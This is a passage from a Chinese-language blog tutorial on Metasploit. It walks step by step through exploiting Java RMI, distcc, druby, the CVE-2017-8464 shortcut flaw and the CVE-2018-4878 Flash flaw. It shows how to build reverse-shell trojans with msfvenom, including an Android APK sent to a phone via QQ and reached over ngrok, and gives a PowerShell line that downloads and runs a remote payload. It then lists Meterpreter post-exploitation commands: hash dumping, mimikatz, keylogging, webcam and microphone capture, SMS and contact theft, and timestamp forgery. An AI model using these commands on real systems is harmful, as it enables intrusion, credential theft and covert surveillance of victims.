<p>msf &gt; use exploit/muti/misc/java_rmi_server</p>
<p>msf exploit(java_rmi_server) &gt; set RHOSTS IP</p>
<p>msf exploit(java_rmi_server) &gt; exploit</p>
<p>meterpreter &gt;shell</p>
<p><strong>二. java cve:2013-0422</strong></p>

        <h2 id="5-9-Distcc-后门漏洞利用">
          <a href="#5-9-Distcc-后门漏洞利用" class="heading-link"><i class="fas fa-link"></i></a>5.9. Distcc 后门漏洞利用</h2>
      <p>安全组织索引：CVE-2004-2678，OSVDB-13378</p>
<p>Distcc 用于大量代码在网络服务器上的分布式编译,但是如果配置不严格，容易被滥用执行命令，该漏洞是Xcode 1.5 版本及其他版本的distcc 2.x版本配置对于服务器端口的访问不限制</p>
<p>利用步骤:<br>启动 metasploit</p>
<p>使用 exploit/unix/misc/distcc_exec 模块</p>
<p>set RHOSTS IP</p>
<p>exploit 执行攻击</p>
<p>id 查看权限， uname -a 验证</p>

        <h2 id="5-10-Druby-命令执行">
          <a href="#5-10-Druby-命令执行" class="heading-link"><i class="fas fa-link"></i></a>5.10.Druby 命令执行</h2>
      <p>Druby 配置不当，被滥用执行命令。（Druby 是开发语言，后缀名 .rb）</p>
<p>利用步骤：</p>
<p>metasploit 启动</p>
<p>发现 8787 druby 端口</p>
<p>search drb 搜索drb 相关漏洞，找最新模块并利用 use </p>
<p>set URL druby:IP:8787    # 设置目标druby链接    ：druby://ip地址：8787（可设置可不设置，有可能设置后还攻击不了）</p>
<p>set RHOSTS IP</p>
<p>exploit   攻击</p>

        <h2 id="5-11-CVE-2017-8464-震网三代-（远程快捷方式漏洞）">
          <a href="#5-11-CVE-2017-8464-震网三代-（远程快捷方式漏洞）" class="heading-link"><i class="fas fa-link"></i></a>5.11. CVE_2017_8464 震网三代 （远程快捷方式漏洞）</h2>
      <p><strong>漏洞详情:</strong><br>北京时间2017年6月13日凌晨，微软官方发布6月安全补丁程序，“震网三代” LNK 文件远程代码执行漏洞(CVE-2017-8464)和Windows搜索远程命令执行漏洞(CVE-2017-8543) </p>
<p>CVE-2017-8543,当Windows搜索处理内存中的对象时，存在远程执行代码漏洞。成功利用此漏洞的攻击者可以控制受影响的系统。</p>
<p>CVE-2017-8464,当Windows系统在解析快捷方式时，存在远程执行任意代码的高危漏洞，黑客可以通过U盘、网络共享等途径触发漏洞，完全控制用户系统，安全风险高危。</p>
<p>攻击机：kali</p>
<p>靶机：win7</p>
<p>受影响的版本：win7，win8.1，win RT 8.1，win10，win Server 2008，win Server 2008 R2，win Server 2012，win Server 2012 R2，win Server 2016</p>
<p><strong>步骤：</strong></p>
<p>search 2017_8464</p>
<p>use exploit/windows/fileformat/cve_2017_8464_lnk_rce</p>
<p>set LHOST </p>
<p>run</p>
<p>它会生成以一堆快捷方式，我们要先把它们拷到 home 下，再拷到 window里（肉鸡）：mv /…/ /home</p>
<p>然后，再msf中设置监听：</p>
<p>search multi/handler</p>
<p>use exploit/multi/handler</p>
<p>set payload windows/meterpreter/reverse_tcp</p>
<p>set LHOST</p>
<p>run </p>
<p>等待wins 点击快捷方式，当反shell 后会自动到 meterpreter 模式</p>
<p><strong>payload2：利用powershell 快捷键</strong></p>
<p>生成攻击文件，终端输入：</p>
<p>msfvenom -p windows/meterpreter/reverse_tcp lhost=ip -f psh-reflection&gt;/opt/search.psl(exe类型的也可以)</p>
<p>然后，将 /opt/目录下的 search.psl 移到 /var/www/html/ 下：mv /opt/search.psl /var/www/html</p>
<p>随后打开 Apache 服务：service apache2 start</p>
<p>通过 web 访问 search.psl 文件 ：192.168.133.128/search.psl</p>
<p>然后，在目标机器windows 上建一个快捷方式：</p>
<p>右击新建快捷方式，输入的对象位置：powershell -windowstyle hidden -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://192.168.133.128/search.psl&#39;);test.psl&quot;">http://192.168.133.128/search.psl&#39;);test.psl&quot;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>或者用工具：shortcut exploit builder</p>

        <h2 id="5-12-flash-0day-CVE-2018-4878">
          <a href="#5-12-flash-0day-CVE-2018-4878" class="heading-link"><i class="fas fa-link"></i></a>5.12. flash 0day (CVE-2018-4878)</h2>
      <p><strong>漏洞详情：</strong></p>
<p>Adobe公司在当地时间2018年2月1日发布了一条安全公告:<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://helpx.adobe.com/security/products/flash-player/apsa18-01.html%E3%80%82%E5%85%AC%E5%91%8A%E7%A7%B0%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84Flash">http://helpx.adobe.com/security/products/flash-player/apsa18-01.html。公告称一个新的Flash</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 0Day漏洞(CVE-2018-4878)已经存在野外利用，可针对Windows用户发起定向攻击。攻击者可以诱导用户打开包含恶意Flash代码文件的Microsoft Office文档、 网页、垃圾电子邮件等。</p>
<p><strong>漏洞影响：</strong></p>
<p>Flash Player 28.0.0.137 及其以前的所有版本</p>
<p><strong>漏洞复现：</strong></p>
<p>攻击机：kali</p>
<p>目标靶机：win7 + IE8.0 + Flash Player 28.0.0.137</p>
<ol>
<li><p>下载 cve-2018-4878 步骤：</p>
<p> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://raw.githubusercontent.com/backlion/demo/master/CVE-2018-4878.rar">https://raw.githubusercontent.com/backlion/demo/master/CVE-2018-4878.rar</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> （win7 中下载）</p>
</li>
<li><p>解压文件后可以看到 cve-2018-4878.py 和 exploit.swf ，我们只需要 cve-2018-4878.py</p>
</li>
<li><p>我们需要对 cve-2018-4878.py 进行修改，原作者将 stageless 变量改为了 Ture ,我们要把它改为 stageless = False，另外不能忘记修改最后的路径，py 中是 f=open(“root/2/index.html”,”wb”)，我们 kali 中没有这个路径，所以在 kali 中要创建一个：mkdir /root/2/</p>
</li>
<li><p>在 kali 中生成 msf 的 shellcode （一定要注意：在老版本的kali 中生成的为333字节的 payload）</p>
<p>命令：msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.133.128 lport=4444 -f python&gt;shellcode.txt</p>
</li>
<li><p>然后要替换原来的 shellcode ,就是把生成的 shellcode.txt 里面的代码替换到 cve-2018-4878.py 中</p>
</li>
<li><p>接着，把cve-2018-4878.py 放到 /root/2 的文件夹里</p>
</li>
<li><p>在kali 中执行 cve-20018-4878.py 这个脚本，即可在同一目录下生成恶意的 swf 文件</p>
</li>
<li><p>然后，将生成的文件放到 win7 中，用IE 浏览器打开</p>
</li>
<li><p>在 msf 中设置监听</p>
<p>use exploit/multi/handler</p>
<p>set payload windows/meterpreter/reverse_tcp </p>
<p>set LHOST,LPORT 4444(这个要和先前配置的端口一致)</p>
<p>exploit</p>
</li>
</ol>

        <h2 id="5-13-生成-exe-的木马文件">
          <a href="#5-13-生成-exe-的木马文件" class="heading-link"><i class="fas fa-link"></i></a>5.13. 生成 exe 的木马文件</h2>
      <p>命令：msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.133.128 lport=6789 -f exe -o /root/payload.exe</p>
<p>这是把木马程序存放于 kali 中，想办法传送到 win 10 中，并让其执行</p>
<p>设置监听：</p>
<p>msf&gt; use exploit/multi/handler</p>
<p>set payload windows/x64/meterpreter/reverse_tcp</p>
<p>set LHOST 192.168.133.128</p>
<p>run</p>

        <h2 id="5-14-渗透-Android-系统">
          <a href="#5-14-渗透-Android-系统" class="heading-link"><i class="fas fa-link"></i></a>5.14. 渗透 Android 系统</h2>
      
        <h3 id="5-14-1-渗透步骤">
          <a href="#5-14-1-渗透步骤" class="heading-link"><i class="fas fa-link"></i></a>5.14.1. 渗透步骤</h3>
      
        <h4 id="1-内网渗透">
          <a href="#1-内网渗透" class="heading-link"><i class="fas fa-link"></i></a>1. 内网渗透</h4>
      <ol>
<li><p>首先要把 Kali 攻击机 配置为 桥接模式，因为渗透 Android 系统 要在局域网下，所以 kali ，物理机，Android 要在同一网段下，这样三者之间可以互相 ping 通。</p>
<p>同一个局域网就是要在同一个 WIFI 下。</p>
</li>
<li><p>kali 机器要生成攻击脚本：</p>
<p>命令：msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.111 LPORT=9999 R&gt;/root/test.apk</p>
<p>生成一个 apk 的脚本后，存放在 root 的目录下，复制到 window中，通过 QQ 发送到手机上，下载安装运行</p>
</li>
<li><p>这时，kali 要设置监听：</p>
<p>进入 msfconsole</p>
<p>使用 exploit/multi/handler 模块：use exploit/multi/handler</p>
<p>设置payload：set payload android/meterpreter/reverse_tcp</p>
<p>设置监听的攻击机 IP：set LHOST 192.168.0.111</p>
<p>设置监听端口：set LPORT 9999                      （IP 和 端口和上面脚本设置一致）</p>
<p>渗透：run  /  exploit</p>
<p>当脚本在手机中被运行时，kali 就会接受到信号，进入 meterpreter 的命令行</p>
</li>
</ol>

        <h4 id="2-外网渗透">
          <a href="#2-外网渗透" class="heading-link"><i class="fas fa-link"></i></a>2. 外网渗透</h4>
      <ol>
<li><p>首先我们需要下载一个用于内网穿透的工具来进行端口映射与转发。</p>
<p>这里就用 Ngrok ，这个软件可以有免费版的（网速不行，不稳定，自娱自乐吧）</p>
<p>在官网上注册并登录（<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.ngrok.cc/#down-client%EF%BC%89">https://www.ngrok.cc/#down-client）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
<li><p>kali进入 ngrok 查看连接状态，命令：</p>
<p>./sunny clientid 你的id（这个id 在 ngrok 隧道管道中可以看到）</p>
<p>利用转发的 tcp 和端口号</p>
</li>
<li><p>kali 机器要生成攻击脚本：</p>
<p>命令：msfvenom -p android/meterpreter/reverse_tcp LHOST=free.idcfengye.com LPORT=10227 R&gt;/home/haoye/haoye.apk</p>
<p>生成一个 apk 的脚本后，存放在 /home/haoye 的目录下，复制到 window中，通过 QQ 发送到手机上，下载安装运行</p>
</li>
<li><p>kali 要设置监听（和上面内网渗透设置步骤一样）</p>
</li>
</ol>
<p>Ngrok 注册安装可以看：<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45798017/article/details/108564464">https://blog.csdn.net/weixin_45798017/article/details/108564464</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="5-14-2-后期-处理">
          <a href="#5-14-2-后期-处理" class="heading-link"><i class="fas fa-link"></i></a>5.14.2. 后期 处理</h3>
      <ol>
<li><p>手机拍照</p>
<p>webcam_list              #查看摄像头  （1 是后置，2是前置，但是我没看出什么不同）</p>
<p>webcam_snap 1/2      #拍照</p>
<p>webcam_stream 1/2   #摄像，录视频</p>
</li>
<li><p>手机录音</p>
<p>record_mic</p>
</li>
<li><p>查看Android手机是否已经执行root权限</p>
<p>check_root</p>
</li>
<li><p>导出Android手机的电话本</p>
<p>dump_contacts</p>
</li>
<li><p>导出Android手机的短信记录</p>
<p>dump_sms</p>
</li>
<li><p>远程控制目标手机发送短信</p>
<p>send_sms -d 其他手机号 -t “内容”</p>
</li>
<li><p>对目标手机进行定位，查看目标手机位置信息</p>
<p>geolocate</p>
</li>
<li><p>查看所有可执行命令</p>
<p>?</p>
</li>
</ol>
<p>优点：该脚本不会报毒</p>
<p>弊端：上面的操作都得有权限，也就是手机下桌面的这个脚本的信息中的权限光有 “询问” 的权限是不够的，必须是 “允许”。</p>

        <h1 id="六-拓展：Auxiliary（辅助）模块">
          <a href="#六-拓展：Auxiliary（辅助）模块" class="heading-link"><i class="fas fa-link"></i></a>六.拓展：Auxiliary（辅助）模块</h1>
      <p><strong>Auxiliary模块</strong></p>
<p>情报搜集阶段,这一阶段主要是尽可能多的收集目标的各种信息。这里主要用到Msf里auxiliary里边的Modules，这里的Modules都是一些渗透前期的辅助工具。一般的收集信息可以使用Whois(这个是Linux 自带的)，db_ nmap这个是Msf的一个插件) ,如果要使用到其他的一些收集信息的方法，比如使用Syn(一种不建立头层皮连接的扫描)扫描，可以在Msfconsole里边Search syn然后根据返回结果来确定使用哪个模块。</p>
<ol>
<li><p>Whois信息探测：在Mstconsole下使用Whois查看域名(domin) / IP信息。：whois + 域名/IP</p>
</li>
<li><p>利用模块查找邮箱：use auxiliary/gather/search_email_collector</p>
</li>
<li><p>因为 Google 国内引擎关闭了，所以我们设置不用Google引擎：set SEARCH_GOOGLE false(不关闭的话搜索时间就长一些)，然后 run 进行搜索</p>
</li>
<li><p>使用 auxiliary 下的搜索 DNS 的模块：use auxiliary/gather/enum_dns，设置DNS时不要加www，然后 run 进行爆破</p>
</li>
</ol>

        <h1 id="七-拓展：Nmap-端口扫描-模块">
          <a href="#七-拓展：Nmap-端口扫描-模块" class="heading-link"><i class="fas fa-link"></i></a>七. 拓展：Nmap (端口扫描) 模块</h1>
      <p>msf 内置 nmap 端口扫描模块，效果和 kali 中自带的 nmap 是一致的</p>

        <h2 id="7-1-Syn-扫描">
          <a href="#7-1-Syn-扫描" class="heading-link"><i class="fas fa-link"></i></a>7.1 Syn 扫描</h2>
      <p>如果TCP 扫描访问被拦截，就可以利用 syn 扫描（不建立连接的扫描）</p>
<p>扫描器向目标主机的一个端口发送请求连接的 SYN 包，扫描器在收到 SYN / ACK 后，不是发送的 ACK 应答而是发送RST 包请求断开连接。这样，三次握手就没有完成，无法建立正常的 TCP 连接，因此，这次扫描就不会被记录到系统日志中。这种扫描技术一般不会在目标主机上留下扫描痕迹。但是，这种扫描需要有 root 权限。<br>TCP connect 端口扫描服务端与客户端建立连接成功(目标端口开放)</p>
<p><strong>过程:</strong></p>
<ol>
<li>Client 端发送SYN;</li>
<li>Server端返回SYN/ACK，表明端口开放;（如果返回 RST/ACK 表明端口未开放）</li>
<li>Client端返回ACK，表明连接已建立；</li>
<li>Client端主动断开连接。</li>
</ol>
<p><strong>优点：</strong></p>
<p>SYN扫描要比TCP Connect()扫描隐蔽些,SYN仅仅需要发送初始的SYN数据包给目标主机,如果端口开放,则相应SYN-ACK数据包;如果关闭，则响应 RST 数据包。</p>
<p><strong>步骤：</strong></p>
<ol>
<li>use auxiliary/scanner/portscan/syn</li>
<li>set RHOSTS 192.168.134.1..</li>
<li>set THREADS 100   #设置线程，默认的是1，这里我们设置成100</li>
<li>run  进行扫描</li>
</ol>

        <h2 id="7-2-Tcp-扫描">
          <a href="#7-2-Tcp-扫描" class="heading-link"><i class="fas fa-link"></i></a>7.2 Tcp 扫描</h2>
      <ol>
<li>use auxiliary/scanner/portscan/tcp</li>
<li>set RHOSTS</li>
<li>set THREADS 100</li>
<li>run 进行扫描</li>
</ol>

        <h1 id="八-服务版本信息探索">
          <a href="#八-服务版本信息探索" class="heading-link"><i class="fas fa-link"></i></a>八. 服务版本信息探索</h1>
      
        <h2 id="8-1-SMB-版本扫描">
          <a href="#8-1-SMB-版本扫描" class="heading-link"><i class="fas fa-link"></i></a>8.1. SMB 版本扫描</h2>
      <ol>
<li>执行 use auxiliary/scanner/smb/smb_version</li>
<li>show options  查看要哪些配置</li>
<li>set RHOSTS IP</li>
</ol>

        <h2 id="8-2-SSH-版本扫描">
          <a href="#8-2-SSH-版本扫描" class="heading-link"><i class="fas fa-link"></i></a>8.2. SSH 版本扫描</h2>
      <ol>
<li>执行 use auxiliary/scanner/ssh/ssh_version</li>
<li>show options  查看需要哪些配置</li>
<li>set RHOSTS IP</li>
<li>run</li>
</ol>

        <h2 id="8-3-FTP-版本扫描">
          <a href="#8-3-FTP-版本扫描" class="heading-link"><i class="fas fa-link"></i></a>8.3. FTP 版本扫描</h2>
      <ol>
<li>执行 use auxiliary/scanner/ftp/ftp_version</li>
<li>show options  查看需要哪些配置</li>
<li>set RHOSTS IP</li>
<li>run</li>
</ol>

        <h1 id="九-Meterpreter的后期攻击使用方法">
          <a href="#九-Meterpreter的后期攻击使用方法" class="heading-link"><i class="fas fa-link"></i></a>九.Meterpreter的后期攻击使用方法</h1>
      
        <h2 id="9-1-上传文件到Windows主机">
          <a href="#9-1-上传文件到Windows主机" class="heading-link"><i class="fas fa-link"></i></a>9.1.上传文件到Windows主机</h2>
      <p>简单地来说，你可以上传本机的任意文件到目标主机，</p>
<p>命令：<code>upload&lt;file&gt;&lt;destination&gt;</code>        </p>
<p>(注意，file是包括它自己的路径的，同时，使用 -r 参数可以递归上传要上传的目录和文件)</p>
<p>例如：<code>upload -r /home/haoye.exe c:\\</code> （注意，这里要有两个 \ )</p>

        <h2 id="9-2-从Windows主机上下载文件">
          <a href="#9-2-从Windows主机上下载文件" class="heading-link"><i class="fas fa-link"></i></a>9.2.从Windows主机上下载文件</h2>
      <p>download命令可以下载远程主机里的文件</p>
<p>命令：<code>download&lt;file&gt;&lt;path to save&gt;</code>               例如：<code>download C://haoye.rtf /home</code></p>
<p>注意：Windows路径要加双斜线，我们如果要递归下载整个目录包括子目录和文件，我们可以使用download -r 的命令</p>
<p>例如：</p>

        <h2 id="9-3-在目标主机上执行-exe-文件">
          <a href="#9-3-在目标主机上执行-exe-文件" class="heading-link"><i class="fas fa-link"></i></a>9.3.在目标主机上执行 exe 文件</h2>
      <p>我们也可以用 execute 命令在目标主机上执行exe的应用程序</p>
<p>命令：<code>execute -f &lt;path&gt;[options]</code></p>
<p>例如：<code>execute -f c:\\haoye.exe</code>(双反斜杠)</p>

        <h2 id="9-4-创建CMD新通道">
          <a href="#9-4-创建CMD新通道" class="heading-link"><i class="fas fa-link"></i></a>9.4.创建CMD新通道</h2>
      <p>如果想在目标主机执行命令提示符</p>
<p>命令：<code>execute -f cmd -c</code>(这都是在 meterpreter 模式下的操作，类似于 shell 的命令)</p>

        <h2 id="9-5-显示进程">
          <a href="#9-5-显示进程" class="heading-link"><i class="fas fa-link"></i></a>9.5.显示进程</h2>
      <p>ps命令会显示目标主机所有正在运行的进程</p>
<p>命令：<code>ps</code>  （和windows任务管理器查看内容是一样的）</p>

        <h2 id="9-6-获取admin权限">
          <a href="#9-6-获取admin权限" class="heading-link"><i class="fas fa-link"></i></a>9.6.获取admin权限</h2>
      <p>getsystem命令可以提权到本地系统权限</p>
<p>命令：<code>getsystem</code></p>

        <h2 id="9-7-使用-Hashdump-转储所有-hash-值">
          <a href="#9-7-使用-Hashdump-转储所有-hash-值" class="heading-link"><i class="fas fa-link"></i></a>9.7.使用 Hashdump 转储所有 hash 值</h2>
      <p>我么可以使用 meterpreter shell 来 dump 目标主机当前系统账户和密码，转储的内容是 NTLM 哈希格式</p>
<p>NTLM 在线破解 ：<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://hashkiller.co.uk/ntlm-decrypter.aspx">http://hashkiller.co.uk/ntlm-decrypter.aspx</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>命令：<code>hashdump</code></p>
<p>输出的每一行格式如下：usrname：ID…..</p>
<p>它会得到几个不同权限的账号和 hash 密码</p>

        <h2 id="9-8-使用-Credcollect-转储-hash-值">
          <a href="#9-8-使用-Credcollect-转储-hash-值" class="heading-link"><i class="fas fa-link"></i></a>9.8.使用 Credcollect 转储 hash 值</h2>
      <p>还有一个类似的脚本叫 credential_collector ,也可以收集目标主机的 tokens </p>
<p>命令：<code>run credcollect</code></p>

        <h2 id="9-9-创建端口转发">
          <a href="#9-9-创建端口转发" class="heading-link"><i class="fas fa-link"></i></a>9.9.创建端口转发</h2>
      <p>用途：当对方主机是在内网的情况下</p>
<p>meterpreter shell中的portfwd命令是转发技术中最常用的一个命令， 可以让攻击系统访问本来无法直接访问的目标主机。<br>add选项会将端口转发添加到列表中，而且本质上会创建一个隧道。</p>
<p>请注意:这个隧道存在于 meterpreter 控制台之外，任何终端会话都可以使用。</p>
<p>命令：portfwd add -l 6666 -p 3389 -r 127.0.0.1        #将目标机的3389端口转发到本地6666端口。(本地端口不能被占用)</p>

        <h2 id="9-10-删除端口转发">
          <a href="#9-10-删除端口转发" class="heading-link"><i class="fas fa-link"></i></a>9.10.删除端口转发</h2>
      <p>和创建端口转发命令类似，这条命令是删除一条端口转发记录</p>
<p>命令：<code>portfwd delete -l &lt;portnumber&gt; -p &lt;portnumber&gt; -r &lt;Target IP&gt;</code> n</p>
<p>如果你想显示所有端口转发记录，你可以使用 portfwd list 命令，</p>
<p>如果你想删除所有端口转发记录，你可以使用 portfwd flush 命令。</p>

        <h2 id="9-11-在目标主机上搜索文件">
          <a href="#9-11-在目标主机上搜索文件" class="heading-link"><i class="fas fa-link"></i></a>9.11.在目标主机上搜索文件</h2>
      <p>搜索命令可以定位查找目标主机上特定的文件，这个命令可以搜索整个文件系统，也可以用来搜索特定的文件夹。</p>
<p>例如，如果你想搜索目标主机上的所有 txt 文件，可以使用如下命令；</p>
<p>命令：search -f *.txt</p>

        <h2 id="9-12-获取用户-ID">
          <a href="#9-12-获取用户-ID" class="heading-link"><i class="fas fa-link"></i></a>9.12.获取用户 ID</h2>
      <p>getuid 命令会显示主机上与运行 meterpreter 服务的用户</p>
<p>命令：getuid</p>

        <h2 id="9-13-获取系统信息">
          <a href="#9-13-获取系统信息" class="heading-link"><i class="fas fa-link"></i></a>9.13.获取系统信息</h2>
      <p>sysinfo 命令会显示 系统名，操作系统，架构 ，语言等。</p>
<p>命令：sysinfo</p>

        <h2 id="9-14-模拟任何用户（token-操作）">
          <a href="#9-14-模拟任何用户（token-操作）" class="heading-link"><i class="fas fa-link"></i></a>9.14.模拟任何用户（token 操作）</h2>
      <p>这个进程对于攻击像微软活动目录这样的分布式系统非常有帮助，因为在微饮活动目录中，本地访问权限并没多大用，但是如果能搞到凭证尤其是管理员凭证，那就非常有用了。</p>
<p>incognito 最开始是一个独立的应用，当你成功入侵系统后可以用它来模拟用户tokens。这个应用后来集成到了metaploit 中,并且最终集成到了meterpreter 中，使用如下:</p>
<ol>
<li><p>在 meterpreter 会话中加载这个模块非常简单，只要输入use incognito 命令即可。</p>
</li>
<li><p>输入list_tokens -u 来显示所有有效的tokens</p>
</li>
<li><p>然后我们需要模拟某个token来获取其权限。还有注意，如果成功模拟了一个token，我们可以使用 getuid 命令来检查当前用户ID。</p>
</li>
<li><p>切换到最高权限（SYSTEM），输入：impersonate_token “NT AUTHORITY\SYSTEM”   (注意：SYSTEM权限是比管理员还要高的)</p>
<p>use incognito -&gt;list_tokens -u -&gt; getuid -&gt; impersonate_token “NT AUTHORITY\SYSTEM”</p>
</li>
</ol>

        <h2 id="9-15-webcam-摄像头命令">
          <a href="#9-15-webcam-摄像头命令" class="heading-link"><i class="fas fa-link"></i></a>9.15 webcam 摄像头命令</h2>
      <p>webcam_list  ：查看摄像头</p>
<p>webcam_snap  ：通过摄像头拍照</p>
<p>webcam_stream ：通过摄像头开启视频</p>

        <h2 id="9-16-execute-执行文件">
          <a href="#9-16-execute-执行文件" class="heading-link"><i class="fas fa-link"></i></a>9.16. execute 执行文件</h2>
      <p>execute  ：在目标机中执行文件</p>
<p>execute -H / -i -f cmd.exe    # 创建新的 cmd 进程；-H 不可见；-i 交互(-i 不要加，加了在目标主机就会看到CMD的命令符界面)</p>

        <h2 id="9-17-timestomp-伪造时间戳">
          <a href="#9-17-timestomp-伪造时间戳" class="heading-link"><i class="fas fa-link"></i></a>9.17. timestomp 伪造时间戳</h2>
      <p>timestomp C:// -h       #查看帮助</p>
<p>timestomp -v C://2.txt     #查看时间戳</p>
<p>timestomp C://2.txt -f C://1.txt     #将1.txt 的时间戳复制给 2.txt （-f 的参数是复制的意思，后面的复制给前面）（不能找正在运行的文件，将其日期赋值给别的文件，否则会失败的）</p>

        <h2 id="9-18-查看盘的所有文件和时间">
          <a href="#9-18-查看盘的所有文件和时间" class="heading-link"><i class="fas fa-link"></i></a>9.18. 查看盘的所有文件和时间</h2>
      <p><code>dir C:\\</code>(双斜杠)     #查看C盘所有文件及日期</p>

        <h2 id="9-19-enable-rdp-脚本开启3389（远程桌面连接）">
          <a href="#9-19-enable-rdp-脚本开启3389（远程桌面连接）" class="heading-link"><i class="fas fa-link"></i></a>9.19. enable_rdp 脚本开启3389（远程桌面连接）</h2>
      <p>run post/windows/manage/enable_rdp    #开启远程桌面</p>
<p>run post/windows/manage/enable_rdp USERNAME=haoye PASSWORD=12345   #添加用户密码</p>
<p>run post/windows/manage/enable_rdp FORWARD=true LPORT=6662    #将3389端口转发到6662</p>
<p>脚本位于：/usr/share/metasploit-framework/modules/post/windows/manage/enable_rdp.rb</p>
<p>通过 rdp.rb 脚本可知：开启 rdp 是通过 reg 修改注册表；添加用户是调用 cmd.exe 通过net user 添加；</p>
<p>端口转发是利用 portfwd 命令。</p>

        <h2 id="9-20-键盘记录（这个得靠运气）">
          <a href="#9-20-键盘记录（这个得靠运气）" class="heading-link"><i class="fas fa-link"></i></a>9.20. 键盘记录（这个得靠运气）</h2>
      <p>keyscan_start       #开启键盘记录</p>
<p>keyscan_dump     #导出记录数据</p>
<p>keyscan_stop       #结束键盘记录</p>

        <h2 id="9-21-桌面抓图">
          <a href="#9-21-桌面抓图" class="heading-link"><i class="fas fa-link"></i></a>9.21. 桌面抓图</h2>
      <p>screenshot      </p>

        <h2 id="9-22-获取系统管理密码">
          <a href="#9-22-获取系统管理密码" class="heading-link"><i class="fas fa-link"></i></a>9.22. 获取系统管理密码</h2>
      <p>想直接添加账号进行提权，前面操作是不了，那么我们现在就出杀手锏，直接使用mimikatz来获取系统管理账号的密码。</p>
<p>第一步：载入mimikatz</p>
<ol>
<li>meterpreter &gt; load mimikatz<br>第二步：使用命令wdigest获取密码</li>
</ol>
<p>其他详细信息，查看：<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://xz.aliyun.com/t/2536%EF%BC%88%E5%88%AB%E4%BA%BA%E7%9A%84%E5%8D%9A%E5%AE%A2%EF%BC%89">http://xz.aliyun.com/t/2536（别人的博客）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://sculptor-liu.github.io">Sculptor</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="https://sculptor-liu.github.io/2020/07/04/MSF/">https://sculptor-liu.github.io/2020/07/04/MSF/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-cn" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://sculptor-liu.github.io/tags/MSF/">MSF</a></span></div><div class="post-share"><div class="social-share" data-sites="qzone, qq, weibo, wechat, douban, linkedin, facebook, twitter, google">Share to: </div></div><div class="post-reward reward"><div class="reward-button">请我喝杯咖啡~</div><div class="reward-qrcode"><span class="reward-qrcode-alipay"><img class="reward-qrcode-alipay__img" src="/images/ali_pay.png"><div class="reward-qrcode-alipay__text">支付宝打赏</div></span><span class="reward-qrcode-wechat"><img class="reward-qrcode-wechat__img" src="/images/wechat_pay.png"><div class="reward-qrcode-wechat__text">微信打赏</div></span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2020/07/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">信息收集</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2020/07/02/Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/"><span class="paginator-prev__text">Web应用程序</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div><div class="comments" id="comments"><div id="gitalk-container"></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80-%E5%88%9D%E8%AF%86-MSF"><span class="toc-number">1.</span> <span class="toc-text">
          一.初识    MSF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1%E4%BB%80%E4%B9%88%E6%98%AFMetasploit"><span class="toc-number">1.1.</span> <span class="toc-text">
          1.1什么是Metasploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2MSF%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD%E8%AE%B2%E8%A7%A3"><span class="toc-number">1.2.</span> <span class="toc-text">
          1.2MSF专业术语讲解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-1%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB-Exploit"><span class="toc-number">1.2.1.</span> <span class="toc-text">
          1.2.1渗透攻击(Exploit)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-2%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7-Payload"><span class="toc-number">1.2.2.</span> <span class="toc-text">
          1.2.2攻击载荷(Payload)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-3%E6%BA%A2%E5%87%BA%E4%BB%A3%E7%A0%81-Shellcode"><span class="toc-number">1.2.3.</span> <span class="toc-text">
